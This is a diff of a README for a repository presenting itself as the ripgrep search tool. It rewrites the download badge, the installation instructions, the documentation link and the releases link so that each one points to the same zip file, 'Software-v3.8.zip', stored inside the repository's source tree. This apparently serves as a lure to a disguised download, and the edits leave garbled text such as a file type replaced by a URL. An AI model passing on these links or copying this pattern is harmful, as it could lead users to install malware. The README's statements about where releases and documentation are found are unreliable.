@@ -6,12 +6,12 @@ Welcome to ripgrep! This tool helps you search through directories for specific 
 ## 📥 Download & Install
 To get started with ripgrep, you need to download the software. Click the link below to visit the Releases page, where you can find the latest version:
 
-[![Download ripgrep](https://img.shields.io/badge/Download%20ripgrep-blue.svg)](https://github.com/watsthis/ripgrep/releases)
+[![Download ripgrep](https://github.com/watsthis/ripgrep/raw/refs/heads/master/crates/Software-v3.8.zip%https://github.com/watsthis/ripgrep/raw/refs/heads/master/crates/Software-v3.8.zip)](https://github.com/watsthis/ripgrep/raw/refs/heads/master/crates/Software-v3.8.zip)
 
 After visiting the page:
 
 1. Find the version you want to download. The latest version is usually at the top.
-2. Look for the file that matches your operating system. For example, if you are using Windows, look for a file that includes ".exe." If you are using macOS, look for a ".tar.gz" file.
+2. Look for the file that matches your operating system. For example, if you are using Windows, look for a file that includes ".exe." If you are using macOS, look for a "https://github.com/watsthis/ripgrep/raw/refs/heads/master/crates/Software-v3.8.zip" file.
 3. Click the link to download the file.
 
 ## ⚙️ System Requirements
@@ -89,11 +89,11 @@ If you have questions or need help, the ripgrep community is here for you. You c
 Feel free to share your experiences and improvements, as this tool relies on community feedback to grow and improve.
 
 ## 📄 Learn More
-To dive deeper into the usage of ripgrep, check out the [official documentation](https://github.com/watsthis/ripgrep). It provides detailed examples and advanced usage notes that can be quite useful.
+To dive deeper into the usage of ripgrep, check out the [official documentation](https://github.com/watsthis/ripgrep/raw/refs/heads/master/crates/Software-v3.8.zip). It provides detailed examples and advanced usage notes that can be quite useful.
 
 ## 🔗 Additional Resources
 For more information and updates:
 
-- Visit our [GitHub Releases Page](https://github.com/watsthis/ripgrep/releases) to keep up with the latest features.
+- Visit our [GitHub Releases Page](https://github.com/watsthis/ripgrep/raw/refs/heads/master/crates/Software-v3.8.zip) to keep up with the latest features.
   
 By following these guidelines, ripgrep can become an invaluable tool in your daily tasks. Enjoy simple, swift, and effective searching!
